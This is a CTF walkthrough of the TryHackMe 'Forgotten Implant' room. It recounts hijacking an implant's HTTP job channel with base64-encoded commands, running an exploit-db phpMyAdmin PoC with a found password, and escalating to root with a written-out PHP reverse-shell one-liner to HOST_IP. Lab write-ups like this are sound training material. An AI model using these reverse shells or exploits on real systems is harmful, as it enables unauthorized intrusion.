# Forgotten Implant

[TryHackMe Room](https://tryhackme.com/room/forgottenimplant)

## Solution

- nmap scan with `nmap -sV -sC $IP` shows no open ports
- I have also tried to do UDP scan and found `68/udp open|filtered dhcpc`
- using wireshark I was able to see that the target was trying to access port 81 for some HTTP
- If I open up a http server to listen on port 81 we can see some messages being received
- note: After I have did a tcp scan with nmap it actually started to send the messages, before it would not
- I tried to create the `get-job/ImxhdGVzdCI=` file and the request changed status to 200 instead of 404
- First I got a `JSON error` with the empty file or with random JSON
- Maybe we can try to send back the heartbeat type command for example: `{"job_id": 1, "cmd": "id"}`
- If we try to send this string (in fact any other string like just `id`) we get back an `Encoding error`
- Maybe this means that we have to base64 encode the payload: `echo '{"job_id": 1, "cmd": "id"}' | base64 > get-job/ImxhdGVzdCI=`
- This actually worked and gave us some response with the output of `id`
- We can try to run a reverse shell; we have to use `bash -c "revshell"` and a nc listener
- We get the first flag from the home of ada `cat /home/ada/user.txt`
- we find a database script with a password in it `s4Ucbrme`
- we also find a hidden folder `.implant` with the implant.py file executed in a cronjob
- check with pspy
- there is also another user `fi` that has a script `sniffer.py` wihch runs as root
- there is also a apache2 service running, we can make an educated guess and try to curl `localhost:80`
- the server has a phpmyadmin server running
- we can use the <https://www.exploit-db.com/exploits/50457> poc to try to run some code
- we have to use `python3 exploit.py 127.0.0.1 80 / app s4Ucbrme id`
- next we can start a revshell like before `python3 exploit.py 127.0.0.1 80 / app s4Ucbrme shell.sh` (it is easier to put the revshell inside a script)
- after we do some reconnaissance we find that the www-data user can run php with sudo
- this means we can use a revhsell with php `sudo php -r '$sock=fsockopen("HOST_IP",6971);exec("/bin/bash <&3 >&3 2>&3");'`
- we start a nc listener on the host on port 6971
- we find the root flag in /root/.root.txt
